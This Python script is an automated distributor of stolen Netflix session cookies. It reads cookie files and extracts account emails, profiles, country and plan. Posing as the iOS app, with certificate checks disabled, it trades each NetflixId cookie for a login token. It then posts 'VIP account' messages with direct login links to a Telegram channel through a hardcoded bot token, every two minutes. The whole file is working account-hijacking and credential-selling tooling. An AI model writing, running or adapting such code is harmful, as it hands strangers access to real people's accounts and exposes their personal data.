import os
import time
import re
import html
import requests
from urllib3.exceptions import InsecureRequestWarning

# ================= CONFIGURATION =================
TOKEN = "8761634086:AAGEenb8YLL0IP-ReDTG8upj8VN_ZIT9hEs"
CHAT_ID = "-1004447097011"
COOKIES_DIR = "./cookies"
INTERVAL_SECONDS = 2 * 60  # دقيقتان بين كل إرسال
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
# =================================================

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

def extract_cookie_dict(text):
    cookie_dict = {}
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            cookie_dict[parts[5]] = parts[6]

    if "NetflixId" not in cookie_dict:
        match = re.search(r'NetflixId[=\t\s]+([^\s;]+)', text)
        if match:
            cookie_dict["NetflixId"] = match.group(1)
            
    return cookie_dict

def fetch_nftoken(cookie_dict):
    netflix_id = cookie_dict.get("NetflixId")
    if not netflix_id:
        return None

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    try:
        response = requests.get(
            API_URL,
            params=QUERY_PARAMS,
            headers=headers,
            timeout=7,
            verify=False,
        )
        if response.status_code == 200:
            data = response.json()
            token_data = (
                (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
                or {}
            )
            token = token_data.get("token")
            if token:
                return token
    except Exception:
        pass
    return None

def parse_cookies_file(file_path):
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

    # Extract Full Email
    email_match = re.search(r'Email:\s*([^\s@]+(?:@[^\s@]+)?)', content, re.IGNORECASE)
    if not email_match:
        email_match = re.search(r'[–-]\s*Email:\s*([^\s]+)', content, re.IGNORECASE)
    email_full = email_match.group(1).strip() if email_match else "unknown@gmail.com"

    # Extract Profiles & Clean HTML entities
    profiles_match = re.search(r'Profiles:\s*(.+)', content, re.IGNORECASE)
    if profiles_match:
        profiles = profiles_match.group(1).strip()
    else:
        prof_match = re.search(r'Profile:\s*(.+)', content, re.IGNORECASE)
        profiles = prof_match.group(1).strip() if prof_match else "User"
    profiles = html.unescape(profiles)

    # Extract Country
    country_match = re.search(r'Country:\s*([A-Z]{2})', content, re.IGNORECASE)
    country = country_match.group(1).upper() if country_match else "US"

    flags = {
        "ID": "🇮🇩 Indonesia",
        "US": "🇺🇸 United States",
        "TR": "🇹🇷 Turkey",
        "AR": "🇦🇷 Argentina",
        "IN": "🇮🇳 India",
        "BR": "🇧🇷 Brazil",
        "EG": "🇪🇬 Egypt",
        "FR": "🇫🇷 France",
        "DE": "🇩🇪 Germany",
        "CA": "🇨🇦 Canada"
    }
    country_display = flags.get(country, country)

    # Extract Plan / Type if available in file
    plan_match = re.search(r'Plan:\s*(.+)', content, re.IGNORECASE)
    plan_type = plan_match.group(1).strip() if plan_match else "Ultra HD / Premium"

    # استخراج وتوليد التوكن الحقيقي
    cookie_dict = extract_cookie_dict(content)
    token_val = fetch_nftoken(cookie_dict)
    
    if not token_val:
        #Fallback لو الـ API ما ردّش، ياخذ NetflixId العادي
        token_val = cookie_dict.get("NetflixId", "")

    token_clean = token_val.replace(" ", "+")

    pc_link = f"https://www.netflix.com/login?nftoken={token_clean}"
    android_link = f"https://netflix.com/unsupported?nftoken={token_clean}"
    ios_link = f"https://netflix.com/unsupported?nftoken={token_clean}"
    tv_link = f"https://netflix.com/tv2?nftoken={token_clean}"

    msg = f"""✂️ ════════════════════════════════════ ✂️
🎬 **NETFLIX VIP ACCOUNT** 🌟
🔥 **حسابات متوفرة | Available Accounts**

✅ **Status:** Ready For Instant Use
📧 **Email:** `{email_full}`
👥 **Profiles:** {profiles}
🌍 **Country:** {country_display}
💎 **Plan:** {plan_type}

🔗 **Direct Login Links:**
[💻 PC]({pc_link}) | [🤖 Android]({android_link})
[🍏 iOS]({ios_link}) | [📺 TV]({tv_link})

💬 **تفاعل للمزيد | React for more**
⚡ *ISLAFLIX GROUP*
✂️ ════════════════════════════════════ ✂️"""

    return msg

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "Markdown",
        "disable_web_page_preview": True
    }
    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            data = response.json()
            message_id = data.get("result", {}).get("message_id")
            print("[+] Account sent successfully!")
            if message_id:
                add_reaction(message_id)
            return True
        else:
            print(f"[-] Telegram API Error: {response.text}")
            return False
    except Exception as e:
        print(f"[-] Connection Error: {e}")
        return False

def add_reaction(message_id):
    url = f"https://api.telegram.org/bot{TOKEN}/setMessageReaction"
    payload = {
        "chat_id": CHAT_ID,
        "message_id": message_id,
        "reaction": [{"type": "emoji", "emoji": "🔥"}]
    }
    try:
        requests.post(url, json=payload)
    except:
        pass

def main():
    print("[*] Automated Cookie Distributor started.")
    if not os.path.exists(COOKIES_DIR):
        os.makedirs(COOKIES_DIR)

    while True:
        files = os.listdir(COOKIES_DIR)
        txt_files = [f for f in files if f.endswith('.txt')]

        if not txt_files:
            print("[i] No cookie files left in the folder. Waiting 2 minutes to check again...")
            time.sleep(INTERVAL_SECONDS)
            continue

        file_name = txt_files[0]
        file_path = os.path.join(COOKIES_DIR, file_name)
        print(f"\n[*] Processing file: {file_name}")

        try:
            formatted_message = parse_cookies_file(file_path)
            success = send_to_telegram(formatted_message)
            
            if success:
                os.remove(file_path)
                print(f"[+] File successfully sent and deleted: {file_name}")
            else:
                print("[-] Failed to send message, will retry this file in the next cycle.")
        except Exception as e:
            print(f"[-] Error processing file {file_name}: {e}")

        print(f"[*] Waiting 2 minutes before sending the next cookie...")
        time.sleep(INTERVAL_SECONDS)

if __name__ == "__main__":
    main()
